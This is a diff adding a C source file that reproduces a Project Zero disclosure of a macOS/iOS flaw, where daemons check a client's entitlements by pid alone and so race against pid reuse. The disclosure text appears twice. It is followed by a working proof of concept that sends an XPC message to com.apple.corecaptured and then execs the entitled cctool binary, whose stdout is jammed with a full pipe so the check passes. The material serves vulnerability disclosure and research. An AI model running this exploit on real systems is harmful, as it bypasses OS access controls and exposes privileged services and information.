@@ -1,0 +1,221 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1223
+
+One way processes in userspace that offer mach services check whether they should perform an action on
+behalf of a client from which they have received a message is by checking whether the sender possesses a certain entitlement.
+
+These decisions are made using the audit token which is appended by the kernel to every received mach message.
+The audit token contains amongst other things the senders uid, gid, ruid, guid, pid and pid generation number (p_idversion.)
+
+The canonical way which userspace daemons check a message sender's entitlements is as follows:
+
+  audit_token_t tok;
+  xpc_connection_get_audit_token(conn, &tok);
+  SecTaskRef sectask = SecTaskCreateWithAuditToken(kCFAllocatorDefault, tok);
+
+  CFErrorRef err;
+  CFTypeRef entitlement = SecTaskCopyValueForEntitlement(sectask, CFSTR("com.apple.an_entitlement_name"), &err);
+
+  /* continue and check that entitlement is non-NULL, is a CFBoolean and has the value CFBooleanTrue */
+
+The problem is that SecTaskCreateWithAuditToken only uses the pid, not also the pid generation number
+to build the SecTaskRef:
+
+  SecTaskRef SecTaskCreateWithAuditToken(CFAllocatorRef allocator, audit_token_t token)
+  {
+    SecTaskRef task;
+
+    task = SecTaskCreateWithPID(allocator, audit_token_to_pid(token));
+    ...
+
+This leaves two avenues for a sender without an entitlement to talk to a service which requires it:
+
+a) If the process can exec binaries then they can simply send the message then exec a system binary with that entitlement.
+   This pid now maps to the entitlements of that new binary.
+
+b) If the process can't exec a binary (it's in a sandbox for example) then exploitation is still possible if the processes has the ability to
+   crash and force the restart of a binary with that entitlement (a common case, eg via an OOM or NULL pointer deref in a mach service.)
+   The attacker process will have to crash and force the restart of a process with the entitlement a sufficient number of times to wrap
+   the next free pid around such that when it sends the request to the target then forces the entitled process to crash it can crash itself and
+   have its pid reused by the respawned entitled process.
+
+Scenario b) is not so outlandish, such a setup could be achieved via a renderer bug with ability to gain code execution in new renderer processes
+as they are created.
+
+You would also not necessarily be restricted to just being able to send one mach message to the target service as there's no
+constraint that a mach message's reply port has to point back to the sending process; you could for example stash a receive right with
+another process or launchd so that you can still engage in a full bi-directional communication with the target service even
+if the audit token was always checked.
+
+The security implications of this depend on what the security guarantees of entitlements are. It's certainly the case that this enables
+you to talk to a far greater range of services as many system services use entitlement checks to restrict their clients to a small number
+of whitelisted binaries.
+
+This may also open up access to privileged information which is protected by the entitlements.
+
+This PoC just demonstrates that we can send an xpc message to a daemon which expects its clients to have the "com.apple.corecapture.manager-access"
+entitlement and pass the check without having that entitlement.
+
+We'll target com.apple.corecaptured which expects that only the cctool or sharingd binaries can talk to it.
+
+use an lldb invocation like:
+
+  sudo lldb -w -n corecaptured
+
+then run this poc and set a breakpoint after the hasEntitlement function in the CoreCaptureDaemon library.
+
+You'll notice that the check passes and our xpc message has been received and will now be processes by the daemon.
+
+Obviously attaching the debugger like this artificially increases the race window but by for example sending many bogus large messages beforehand
+we could ensure the target service has many messages in its mach port queue to make the race more winnable.
+
+PoC tested on MacOS 10.12.3 (16D32)
+ */
+
+// ianbeer
+#if 0
+MacOS/iOS userspace entitlement checking is racy
+
+One way processes in userspace that offer mach services check whether they should perform an action on
+behalf of a client from which they have received a message is by checking whether the sender possesses a certain entitlement.
+
+These decisions are made using the audit token which is appended by the kernel to every received mach message.
+The audit token contains amongst other things the senders uid, gid, ruid, guid, pid and pid generation number (p_idversion.)
+
+The canonical way which userspace daemons check a message sender's entitlements is as follows:
+
+  audit_token_t tok;
+  xpc_connection_get_audit_token(conn, &tok);
+  SecTaskRef sectask = SecTaskCreateWithAuditToken(kCFAllocatorDefault, tok);
+
+  CFErrorRef err;
+  CFTypeRef entitlement = SecTaskCopyValueForEntitlement(sectask, CFSTR("com.apple.an_entitlement_name"), &err);
+
+  /* continue and check that entitlement is non-NULL, is a CFBoolean and has the value CFBooleanTrue */
+
+The problem is that SecTaskCreateWithAuditToken only uses the pid, not also the pid generation number
+to build the SecTaskRef:
+
+	SecTaskRef SecTaskCreateWithAuditToken(CFAllocatorRef allocator, audit_token_t token)
+	{
+		SecTaskRef task;
+
+		task = SecTaskCreateWithPID(allocator, audit_token_to_pid(token));
+		...
+
+This leaves two avenues for a sender without an entitlement to talk to a service which requires it:
+
+a) If the process can exec binaries then they can simply send the message then exec a system binary with that entitlement.
+   This pid now maps to the entitlements of that new binary.
+
+b) If the process can't exec a binary (it's in a sandbox for example) then exploitation is still possible if the processes has the ability to
+   crash and force the restart of a binary with that entitlement (a common case, eg via an OOM or NULL pointer deref in a mach service.)
+   The attacker process will have to crash and force the restart of a process with the entitlement a sufficient number of times to wrap
+   the next free pid around such that when it sends the request to the target then forces the entitled process to crash it can crash itself and
+   have its pid reused by the respawned entitled process.
+
+Scenario b) is not so outlandish, such a setup could be achieved via a renderer bug with ability to gain code execution in new renderer processes
+as they are created.
+
+You would also not necessarily be restricted to just being able to send one mach message to the target service as there's no
+constraint that a mach message's reply port has to point back to the sending process; you could for example stash a receive right with
+another process or launchd so that you can still engage in a full bi-directional communication with the target service even
+if the audit token was always checked.
+
+The security implications of this depend on what the security guarantees of entitlements are. It's certainly the case that this enables
+you to talk to a far greater range of services as many system services use entitlement checks to restrict their clients to a small number
+of whitelisted binaries.
+
+This may also open up access to privileged information which is protected by the entitlements.
+
+This PoC just demonstrates that we can send an xpc message to a daemon which expects its clients to have the "com.apple.corecapture.manager-access"
+entitlement and pass the check without having that entitlement.
+
+We'll target com.apple.corecaptured which expects that only the cctool or sharingd binaries can talk to it.
+
+use an lldb invocation like:
+
+  sudo lldb -w -n corecaptured
+
+then run this poc and set a breakpoint after the hasEntitlement function in the CoreCaptureDaemon library.
+
+You'll notice that the check passes and our xpc message has been received and will now be processes by the daemon.
+
+Obviously attaching the debugger like this artificially increases the race window but by for example sending many bogus large messages beforehand
+we could ensure the target service has many messages in its mach port queue to make the race more winnable.
+
+PoC tested on MacOS 10.12.3 (16D32)
+#endif
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <xpc/xpc.h>
+
+void exec_blocking(char* target, char** argv, char** envp) {
+  // create the pipe
+  int pipefds[2];
+  pipe(pipefds);
+
+  int read_end = pipefds[0];
+  int write_end = pipefds[1];
+
+  // make the pipe nonblocking so we can fill it
+  int flags = fcntl(write_end, F_GETFL);
+  flags |= O_NONBLOCK;
+  fcntl(write_end, F_SETFL, flags);
+
+  // fill up the write end
+  int ret, count = 0;
+  do {
+    char ch = ' ';
+    ret = write(write_end, &ch, 1);
+    count++;
+  } while (!(ret == -1 && errno == EAGAIN));
+  printf("wrote %d bytes to pipe buffer\n", count-1);
+
+
+  // make it blocking again
+  flags = fcntl(write_end, F_GETFL);
+  flags &= ~O_NONBLOCK;
+  fcntl(write_end, F_SETFL, flags);
+
+  // set the pipe write end to stdout/stderr
+  dup2(write_end, 1);
+  dup2(write_end, 2);
+
+  execve(target, argv, envp);
+}
+
+xpc_connection_t connect(char* service_name){
+  xpc_connection_t conn = xpc_connection_create_mach_service(service_name, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+
+  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+    xpc_type_t t = xpc_get_type(event);
+    if (t == XPC_TYPE_ERROR){
+      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
+    }
+    printf("received an event\n");
+  });
+  xpc_connection_resume(conn);
+  return conn;
+}
+
+int main(int argc, char** argv, char** envp) {
+  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+  xpc_dictionary_set_string(msg, "CCConfig", "hello from a sender without entitlements!");
+
+	xpc_connection_t conn = connect("com.apple.corecaptured");
+
+	xpc_connection_send_message(conn, msg);
+
+  // exec a binary with the entitlement to talk to that daemon
+  // make sure it doesn't exit by giving it a full pipe for stdout/stderr
+  char* target_binary = "/System/Library/PrivateFrameworks/CoreCaptureControl.framework/Versions/A/Resources/cctool";
+  char* target_argv[] = {target_binary, NULL};
+  exec_blocking(target_binary, target_argv, envp);
+
+  return 0;
+}
